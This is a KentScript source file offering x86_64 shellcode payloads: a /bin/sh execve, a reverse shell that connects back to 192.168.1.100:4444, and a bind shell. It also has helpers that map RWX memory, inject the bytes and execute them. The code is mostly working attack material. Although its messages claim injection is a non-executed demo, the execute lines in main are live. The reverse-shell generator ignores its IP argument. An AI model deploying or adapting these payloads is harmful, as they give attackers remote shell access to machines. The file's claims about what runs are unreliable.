:: KentScript Low-Level Payload Demo
:: Direct memory manipulation and shellcode

:: Shellcode: execve("/bin/sh", NULL, NULL) - x86_64
const SHELLCODE = [
    0x48, 0x31, 0xd2,                    :: xor rdx, rdx
    0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69,  :: movabs rbx, 0x68732f6e69622f2f
    0x6e, 0x2f, 0x73, 0x68,
    0x48, 0xc1, 0xeb, 0x08,              :: shr rbx, 8
    0x53,                                :: push rbx
    0x48, 0x89, 0xe7,                    :: mov rdi, rsp
    0x50,                                :: push rax
    0x57,                                :: push rdi
    0x48, 0x89, 0xe6,                    :: mov rsi, rsp
    0xb0, 0x3b,                          :: mov al, 0x3b
    0x0f, 0x05                           :: syscall
];

:: Reverse shell shellcode (connect back)
func generate_reverse_shell(ip: str, port: int) {
    :: Port in network byte order
    let port_high = (port >> 8) & 0xFF;
    let port_low = port & 0xFF;
    
    :: IP bytes for 192.168.1.100
    let ip_bytes = [192, 168, 1, 100];
    :: Shellcode template
    return [
        0x48, 0x31, 0xc0,                :: xor rax, rax
        0x48, 0x31, 0xff,                :: xor rdi, rdi
        0x48, 0x31, 0xf6,                :: xor rsi, rsi
        0x48, 0x31, 0xd2,                :: xor rdx, rdx
        0x4d, 0x31, 0xc0,                :: xor r8, r8
        0x6a, 0x02,                      :: push 2
        0x5f,                            :: pop rdi (AF_INET)
        0x6a, 0x01,                      :: push 1
        0x5e,                            :: pop rsi (SOCK_STREAM)
        0x6a, 0x29,                      :: push 41
        0x58,                            :: pop rax (socket)
        0x0f, 0x05,                      :: syscall
        0x48, 0x97,                      :: xchg rdi, rax
        0x48, 0xb9, 0x02, 0x00,          :: movabs rcx, sockaddr
        port_high, port_low,
        ip_bytes[0], ip_bytes[1], 
        ip_bytes[2], ip_bytes[3],
        0x51,                            :: push rcx
        0x48, 0x89, 0xe6,                :: mov rsi, rsp
        0x6a, 0x10,                      :: push 16
        0x5a,                            :: pop rdx
        0x6a, 0x2a,                      :: push 42
        0x58,                            :: pop rax (connect)
        0x0f, 0x05,                      :: syscall
        0x6a, 0x03,                      :: push 3
        0x5e,                            :: pop rsi
        0x48, 0xff, 0xce,                :: dec rsi (dup2 loop)
        0x6a, 0x21,                      :: push 33
        0x58,                            :: pop rax
        0x0f, 0x05,                      :: syscall
        0x75, 0xf6,                      :: jne loop
        0x48, 0x31, 0xc0,                :: xor rax, rax
        0x50,                            :: push rax
        0x48, 0xbb, 0x2f, 0x62, 0x69,    :: movabs rbx, '/bin/sh'
        0x6e, 0x2f, 0x73, 0x68, 0x00,
        0x53,                            :: push rbx
        0x48, 0x89, 0xe7,                :: mov rdi, rsp
        0x50,                            :: push rax
        0x57,                            :: push rdi
        0x48, 0x89, 0xe6,                :: mov rsi, rsp
        0xb0, 0x3b,                      :: mov al, 59 (execve)
        0x0f, 0x05                       :: syscall
    ];
}

:: Allocate executable memory and inject shellcode
func inject_shellcode(shellcode) {
    let size = len(shellcode);
    
    unsafe {
        :: mmap syscall directly
        let addr = system_syscall(9, 0, size, 0x7, 0x22, -1, 0);
        
        if addr == -1 {
            print("[!] mmap failed");
            return 0;
        }
        
        print(f"[+] Allocated RWX memory at: 0x{addr}");
        
        :: Copy shellcode to executable memory
        let dest = addr;
        for i in range(0, size) {
            ptr_write(dest + i, shellcode[i]);
        }
        
        print(f"[+] Injected {size} bytes of shellcode");
        
        return dest;
    }
}

:: Execute shellcode
func execute_shellcode(addr) {
    unsafe {
        print("[*] Executing shellcode...");
        
        :: Cast to function pointer and call
        asm("call rax");
    }
}

:: Create bind shell payload
func create_bind_shell(port: int) {
    let port_high = (port >> 8) & 0xFF;
    let port_low = port & 0xFF;
    
    return [
        0x48, 0x31, 0xc0,                :: xor rax, rax
        0x48, 0x31, 0xff,                :: xor rdi, rdi
        0x48, 0x31, 0xf6,                :: xor rsi, rsi
        0x6a, 0x02,                      :: push 2
        0x5f,                            :: pop rdi
        0x6a, 0x01,                      :: push 1
        0x5e,                            :: pop rsi
        0x6a, 0x29,                      :: push 41
        0x58,                            :: pop rax
        0x0f, 0x05,                      :: syscall (socket)
        0x48, 0x97,                      :: xchg rdi, rax
        0x52,                            :: push rdx
        0x48, 0xb9, 0x02, 0x00,          :: movabs rcx, sockaddr
        port_high, port_low,
        0x00, 0x00, 0x00, 0x00,
        0x51,                            :: push rcx
        0x48, 0x89, 0xe6,                :: mov rsi, rsp
        0x6a, 0x10,                      :: push 16
        0x5a,                            :: pop rdx
        0x6a, 0x31,                      :: push 49
        0x58,                            :: pop rax
        0x0f, 0x05,                      :: syscall (bind)
        0x6a, 0x32,                      :: push 50
        0x58,                            :: pop rax
        0x6a, 0x01,                      :: push 1
        0x5e,                            :: pop rsi
        0x0f, 0x05,                      :: syscall (listen)
        0x48, 0x31, 0xd2,                :: xor rdx, rdx
        0x48, 0x31, 0xf6,                :: xor rsi, rsi
        0x6a, 0x2b,                      :: push 43
        0x58,                            :: pop rax
        0x0f, 0x05,                      :: syscall (accept)
        0x48, 0x97,                      :: xchg rdi, rax
        0x6a, 0x03,                      :: push 3
        0x5e,                            :: pop rsi
        0x48, 0xff, 0xce,                :: dec rsi
        0x6a, 0x21,                      :: push 33
        0x58,                            :: pop rax
        0x0f, 0x05,                      :: syscall (dup2)
        0x75, 0xf6,                      :: jne loop
        0x48, 0x31, 0xc0,                :: xor rax, rax
        0x50,                            :: push rax
        0x48, 0xbb, 0x2f, 0x62, 0x69,    :: movabs rbx, '/bin/sh'
        0x6e, 0x2f, 0x73, 0x68, 0x00,
        0x53,                            :: push rbx
        0x48, 0x89, 0xe7,                :: mov rdi, rsp
        0x50,                            :: push rax
        0x57,                            :: push rdi
        0x48, 0x89, 0xe6,                :: mov rsi, rsp
        0xb0, 0x3b,                      :: mov al, 59
        0x0f, 0x05                       :: syscall (execve)
    ];
}

:: Direct memory read/write primitives
func arbitrary_read(addr, size) {
    let data = [];
    
    unsafe {
        for i in range(0, size) {
            let byte = ptr_read(addr + i, 1);
            data.append(byte);
        }
    }
    
    return data;
}

func arbitrary_write(addr, data) {
    unsafe {
        for i in range(0, len(data)) {
            ptr_write(addr + i, data[i]);
        }
    }
}

:: Main demo
func main() {
    print("=== KentScript Low-Level Payload Demo ===\n");
    
    print("[1] Basic Shellcode (execve /bin/sh):");
    print(f"    Size: {len(SHELLCODE)} bytes");
    print(f"    Hex: {SHELLCODE}");
    print("");
    
    print("[2] Reverse Shell Generator:");
    let rev_shell = generate_reverse_shell("192.168.1.100", 4444);
    print(f"    Target: 192.168.1.100:4444");
    print(f"    Size: {len(rev_shell)} bytes");
    print("");
    
    print("[3] Bind Shell Generator:");
    let bind_shell = create_bind_shell(8080);
    print(f"    Port: 8080");
    print(f"    Size: {len(bind_shell)} bytes");
    print("");
    
    print("[4] Memory Operations:");
    print("    (Unsafe operations disabled for demo)");
    print("    Would allocate RWX memory");
    print("    Would write magic bytes: [0xDE, 0xAD, 0xBE, 0xEF]");
    print("");
    
    print("[5] Shellcode Injection (DEMO - not executed):");
    print("    Uncomment to inject and execute:");
    print("    let addr = inject_shellcode(SHELLCODE);");
    print("    execute_shellcode(addr);");
    print("");
    
    ::Uncomment to actually execute (WARNING: spawns shell)
    let addr = inject_shellcode(SHELLCODE);
    if addr != 0 {
         execute_shellcode(addr);
    }
    
    print("=== Demo Complete ===");
}

main();
